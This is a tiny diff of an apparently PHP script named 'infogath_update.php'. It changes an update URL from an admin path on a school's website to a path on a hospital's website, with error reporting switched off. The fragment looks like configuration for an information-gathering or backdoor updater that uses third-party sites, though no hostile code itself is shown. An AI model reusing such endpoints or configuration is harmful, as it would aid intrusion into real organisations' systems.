@@ -12,7 +12,7 @@
 $version 	= '1.0.2';
 $random 	= rand(123456789, 6);
 $file 		= 'infogath_update.php';
-$url 		= 'http://smkpembangunanyptplg.sch.id/Admin/';
+$url 		= 'http://rsudinda.co.id/gps/';
 error_reporting(0);
 
 
